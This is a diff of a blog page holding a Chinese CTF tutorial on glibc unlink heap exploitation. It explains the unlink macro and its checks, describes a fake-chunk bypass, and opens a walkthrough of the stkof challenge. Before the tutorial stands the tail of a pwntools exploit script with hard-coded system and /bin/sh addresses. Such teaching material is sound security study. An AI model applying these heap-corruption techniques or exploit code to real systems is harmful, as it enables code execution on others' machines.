process(pwnfile)</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">	</span><br><span class="line">    sys_addr = <span class="number">0x4007A0</span></span><br><span class="line">    binsh_addr = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    create(<span class="number">0x10</span>, p64(binsh_addr) + p64(sys_addr))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -205,7 +606,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2025-06-17 00:44:54 / Modified: 12:50:43" itemprop="dateCreated datePublished" datetime="2025-06-17T00:44:54+08:00">2025-06-17</time>
+      <time title="Created: 2025-06-17 00:44:54 / Modified: 13:11:57" itemprop="dateCreated datePublished" datetime="2025-06-17T00:44:54+08:00">2025-06-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -227,33 +628,33 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <meta name="referrer" content="no-referrer">
+          <meta name="referrer" content="no-referrer" />
 
-<h1 id="一、-Unlink介绍"><a href="#一、-Unlink介绍" class="headerlink" title="一、 Unlink介绍"></a>一、 Unlink介绍</h1><p>Unlink被定义为一个宏（高版本libc中被定义为了静态函数 <code>unlink_chunk</code>)，其源码如下</p>
+<h2 id="一、-Unlink介绍"><a href="#一、-Unlink介绍" class="headerlink" title="一、 Unlink介绍"></a>一、 Unlink介绍</h2><p>Unlink被定义为一个宏（高版本libc中被定义为了静态函数 <code>unlink_chunk</code>)，其源码如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 从双向链表中安全移除节点P的宏</span></span><br><span class="line"><span class="comment"> * AV: 分配区指针，用于错误处理</span></span><br><span class="line"><span class="comment"> * P: 要移除的节点指针</span></span><br><span class="line"><span class="comment"> * BK: 临时存储后驱节点指针</span></span><br><span class="line"><span class="comment"> * FD: 临时存储前驱节点指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">/* 获取P的前驱和后继节点 */</span>                                      </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">    <span class="keyword">else</span> &#123;								      </span><br><span class="line">        <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">            <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 如果后继节点的大小链表指针为空，需要重建 */</span>      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      </span><br><span class="line">                <span class="comment">/* 情况1：P是唯一节点，让后继节点自环 */</span>      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="comment">/* 情况2：将P的大小链表指针转移给后继节点 */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD; <span class="comment">/* 更新后节点的后驱 */</span>      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD; <span class="comment">/* 更新前节点的前驱 */</span>      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; </span><br><span class="line">            <span class="comment">/* 如果后继已有大小链表指针，直接跳过P */</span>      </span><br><span class="line">            <span class="keyword">else</span> &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Unlink是堆管理中的一个操作，用于将一个chunk从<strong>双向链表</strong>中取出。触发unlink，往往是通过free物理相邻的下一块chunk，检查到该chunk的上一块处于free状态（size的prev_inuse为0)，就用unlink将上一块脱链后合并。</p>
 <p>实现过程如下图。（图画的丑陋，别喷）<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617124739742.png" alt="image-20250617124739665"><br>当我们执行Unlink将chunk2从双向链表中取出的时候，这个双向链表就变成下面这个样子。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617124811041.png" alt="image-20250617124810977"></p>
 <p><strong>漏洞点：</strong> 如果我们可以伪造chunk2，通过<strong>控制fd和bk的值</strong>，我们似乎就可以实现任意地址写。<br>但是事情并非如此简单，通过上面给出的源码可以看到，Unlink内部做了许多保护和限制，下面我们就来研究这些保护以及限制。</p>
-<h1 id="二、-保护和限制"><a href="#二、-保护和限制" class="headerlink" title="二、 保护和限制"></a>二、 保护和限制</h1><h2 id="1-chunksize-P-prev-size-next-chunk-P"><a href="#1-chunksize-P-prev-size-next-chunk-P" class="headerlink" title="1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))"></a>1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))</h2><p>这部分检测源码如下：</p>
+<h2 id="二、-保护和限制"><a href="#二、-保护和限制" class="headerlink" title="二、 保护和限制"></a>二、 保护和限制</h2><h3 id="1-chunksize-P-prev-size-next-chunk-P"><a href="#1-chunksize-P-prev-size-next-chunk-P" class="headerlink" title="1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))"></a>1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))</h3><p>这部分检测源码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取下一个块的指针 */</span></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"><span class="comment">/* 检查下一个块的prev_size是否等于当前块size */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;prev_size != size, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>这部分检测检查的是下一个chunk的prev_size是否和当前堆块的prev_size相等（这是free函数中的检测）</p>
 </blockquote>
-<h2 id="2-fd-bk-P-bk-fd-P"><a href="#2-fd-bk-P-bk-fd-P" class="headerlink" title="2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P"></a>2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P</h2><p>这部分检测源码如下：</p>
+<h3 id="2-fd-bk-P-bk-fd-P"><a href="#2-fd-bk-P-bk-fd-P" class="headerlink" title="2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P"></a>2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P</h3><p>这部分检测源码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">  <span class="keyword">else</span> &#123;								      </span><br><span class="line">      <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">      FD-&gt;bk = BK;							      </span><br><span class="line">      BK-&gt;fd = FD;							     </span><br></pre></td></tr></table></figure>
 <p>其实就是在检测这个双向链表的结构是否完整。</p>
-<h2 id="3-not-small"><a href="#3-not-small" class="headerlink" title="3. not small"></a>3. not small</h2><p>这部分检测源码如下：</p>
+<h3 id="3-not-small"><a href="#3-not-small" class="headerlink" title="3. not small"></a>3. not small</h3><p>这部分检测源码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">          &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">          <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">     malloc_printerr (check_action,				      </span><br><span class="line">	       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">	       P, AV);					      </span><br></pre></td></tr></table></figure>
 <p>简单来说，如果chunk的大小落在largebin范围内，就会进行对nextsize的检查</p>
-<h1 id="三、-适用场景及绕过方法"><a href="#三、-适用场景及绕过方法" class="headerlink" title="三、 适用场景及绕过方法"></a>三、 适用场景及绕过方法</h1><h3 id="适用场景（一般来说）"><a href="#适用场景（一般来说）" class="headerlink" title="适用场景（一般来说）"></a>适用场景（一般来说）</h3><ol>
+<h2 id="三、-适用场景及绕过方法"><a href="#三、-适用场景及绕过方法" class="headerlink" title="三、 适用场景及绕过方法"></a>三、 适用场景及绕过方法</h2><h3 id="适用场景（一般来说）"><a href="#适用场景（一般来说）" class="headerlink" title="适用场景（一般来说）"></a>适用场景（一般来说）</h3><ol>
 <li>有一个list专门用于存户malloc得到的指针</li>
 <li>存在溢出漏洞</li>
 </ol>
 <h3 id="保护绕过（以上面讲的适用场景为例）"><a href="#保护绕过（以上面讲的适用场景为例）" class="headerlink" title="保护绕过（以上面讲的适用场景为例）"></a>保护绕过（以上面讲的适用场景为例）</h3><p><strong>保护1</strong><br>通过<strong>溢出</strong>，对下一个堆块进行修改，使得下一个堆块的<strong>prev_size &#x3D; fackchcunk的size，prev_inuse &#x3D; 0</strong><br><strong>保护2</strong><br>对于保护2，可以通过构造facck chunk来绕过。<br>chunk_list存在的时候，我们做以下构造<br>fack chunk的fd指向 存放当前堆块指针的地址 -0x18（bk指针相对于chunk头的偏移是0x18)<br>fack chunk的bk指向 存放当前堆块指针的地址 -0x10（fd指针相对于chunk头的偏移是0x10)<br>这样就实现了 fack_chunk的fd指向的“chunk”的bk指向它，fack_chunk的bk指向的“chunk”指向它，从而成功绕过检测。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fakeFD -&gt; bk == P1 *(&amp;fakeFD + <span class="number">0x18</span>) == P1 *fakeFD == &amp;P1 - <span class="number">0x18</span></span><br><span class="line">fakeBK -&gt; fd == P1 *(&amp;fakeBK + <span class="number">0x10</span>) == P1 *fakeBK == &amp;P1 - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
 <p><strong>保护3</strong><br>更简单了，直接不申请largebin大小的chunk即可。</p>
-<h1 id="四、-例题分析"><a href="#四、-例题分析" class="headerlink" title="四、 例题分析"></a>四、 例题分析</h1><p>题目来源：<a target="_blank" rel="noopener" href="https://wwyq.lanzouo.com/imJ0k2qa2ykf" title="[2014_hitccon_stkof]">[2014_hitccon_stkof]</a><br>先检查一下保护，看一下文件的ELF信息</p>
-<p>可以看到是64位小端序，开启了canary和nx，got表可写<br><img src="/.com//image-20250617005504217.png" alt="image-20250617005504217"></p>
+<h2 id="四、-例题分析"><a href="#四、-例题分析" class="headerlink" title="四、 例题分析"></a>四、 例题分析</h2><p>题目来源：<a target="_blank" rel="noopener" href="https://wwyq.lanzouo.com/imJ0k2qa2ykf" title="[2014_hitccon_stkof]">[2014_hitccon_stkof]</a><br>先检查一下保护，看一下文件的ELF信息</p>
+<p>可以看到是64位小端序，开启了canary和nx，got表可写<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125546826.png" alt="image-20250617125546768"></p>
 <p>丢到ida里面看一看（为了方便查看，改了一些函数和变量的名字）<br>main函数<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617124854232.png" alt="image-20250617124854156"></p>
 <p>creat函数<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617124903435.png" alt="image-20250617124903369"></p>
 <p>delete函数<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617124912527.png" alt="image-20250617124912467"></p>
